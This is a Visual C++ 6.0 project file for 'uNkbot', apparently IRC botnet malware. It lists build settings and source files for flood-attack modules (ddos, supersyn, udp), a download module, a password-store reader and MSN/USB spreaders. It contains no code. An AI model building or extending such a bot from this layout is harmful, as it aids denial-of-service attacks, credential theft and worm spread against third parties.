# Microsoft Developer Studio Project File - Name="uNkbot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=uNkbot - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "uNkbot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "uNkbot.mak" CFG="uNkbot - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "uNkbot - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir ".\Release\Temp"
# PROP BASE Intermediate_Dir ".\Release\Temp"
# PROP BASE Target_Dir ""
# PROP Use_MFC 2
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir ".\Release\Temp"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MD /W2 /GX /O1 /I "lib/openssl/win32/include" /D "WIN32" /D "_CONSOLE" /D "_MBCS" /D "NDEBUG" /D "_AFXDLL" /FR /YX /FD /c
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG" /d "_AFXDLL"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 /nologo /subsystem:console /machine:I386 /libpath:"lib/openssl/win32/lib"
# SUBTRACT LINK32 /incremental:yes
# Begin Target

# Name "uNkbot - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Modules"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Source\Modules\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Modules\download.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Modules\pstore.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Modules\supersyn.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Modules\udp.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Modules\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Modules\ZipIt.cpp
# End Source File
# End Group
# Begin Group "Spreaders"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Source\Spreaders\msn.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\Spreaders\usb.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Source\commands.cpp
# End Source File
# Begin Source File

SOURCE=.\Icon.rc
# End Source File
# Begin Source File

SOURCE=.\Source\irc.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\protocol.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\threads.cpp
# End Source File
# Begin Source File

SOURCE=uNkbot.cpp
# End Source File
# Begin Source File

SOURCE=.\Source\utility.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Header Modules"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Headers\Modules\ddos.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Modules\download.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Modules\pstore.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Modules\supersyn.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Modules\udp.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Modules\visit.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Modules\ZipIt.h
# End Source File
# End Group
# Begin Group "Config"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Config\cmds.h
# End Source File
# Begin Source File

SOURCE=.\Config\config.h
# End Source File
# Begin Source File

SOURCE=.\Headers\defines.h
# End Source File
# End Group
# Begin Group "Header Spreaders"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Headers\Spreaders\msn.h
# End Source File
# Begin Source File

SOURCE=.\Headers\Spreaders\usb.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\Headers\commands.h
# End Source File
# Begin Source File

SOURCE=.\Headers\externs.h
# End Source File
# Begin Source File

SOURCE=.\Headers\functions.h
# End Source File
# Begin Source File

SOURCE=.\Headers\includes.h
# End Source File
# Begin Source File

SOURCE=.\Headers\irc.h
# End Source File
# Begin Source File

SOURCE=.\Headers\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\Headers\protocol.h
# End Source File
# Begin Source File

SOURCE=.\Headers\threads.h
# End Source File
# Begin Source File

SOURCE=.\Headers\uNkbot.h
# End Source File
# Begin Source File

SOURCE=.\Headers\utility.h
# End Source File
# End Group
# End Target
# End Project
